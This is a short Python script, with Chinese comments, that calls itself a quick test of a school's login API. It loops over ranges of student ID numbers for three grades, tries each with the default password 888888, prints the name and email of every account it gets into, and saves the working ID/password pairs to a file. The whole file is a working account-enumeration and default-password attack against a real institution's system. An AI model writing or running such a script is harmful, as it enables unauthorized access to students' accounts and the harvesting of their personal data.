#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
School API快速测试脚本 - 重点测试关键区间
"""

import requests
import json
import time

def quick_test(user_number, password="888888"):
    """快速测试单个账号"""
    url = "https://work.greathiit.com/api/user/loginWai"
    headers = {'Content-Type': 'application/json'}
    payload = {"userNumber": user_number, "password": password, "autoLogin": True, "provider": "account"}
    
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=3)
        if response.status_code == 200:
            data = response.json()
            if data.get("code") == 0 or (data.get("message") == "ok" and data.get("data")):
                user_info = data.get("data", {})
                name = user_info.get("name", "Unknown")
                email = user_info.get("email", "")
                print(f"SUCCESS: {user_number} - {name} ({email})")
                return True
    except:
        pass
    return False

def main():
    print("=== Quick School API Account Test ===")
    valid_accounts = []
    
    # 测试2024年级关键区间
    print("\nTesting 2024 grade (001-030)...")
    for i in range(1, 31):
        account = f"20240100{i:02d}"
        if quick_test(account):
            valid_accounts.append(account)
        time.sleep(0.3)
    
    # 测试2023年级关键区间
    print("\nTesting 2023 grade (100-140)...")
    for i in range(100, 141):
        account = f"2023010{i}"
        if quick_test(account):
            valid_accounts.append(account)
        time.sleep(0.3)
    
    # 测试2022年级关键区间
    print("\nTesting 2022 grade (600-650)...")
    for i in range(600, 651):
        account = f"2022010{i}"
        if quick_test(account):
            valid_accounts.append(account)
        time.sleep(0.3)
    
    print(f"\n=== RESULTS ===")
    print(f"Total valid accounts found: {len(valid_accounts)}")
    for acc in valid_accounts:
        print(f"  - {acc}")
    
    # 保存结果
    with open("D:\\ClaudeCode\\AI_Web\\quick_test_results.txt", "w") as f:
        f.write("Quick School API Test Results\n")
        f.write("=" * 30 + "\n")
        f.write(f"Found {len(valid_accounts)} valid accounts:\n\n")
        for acc in valid_accounts:
            f.write(f"{acc} / 888888\n")

if __name__ == "__main__":
    main()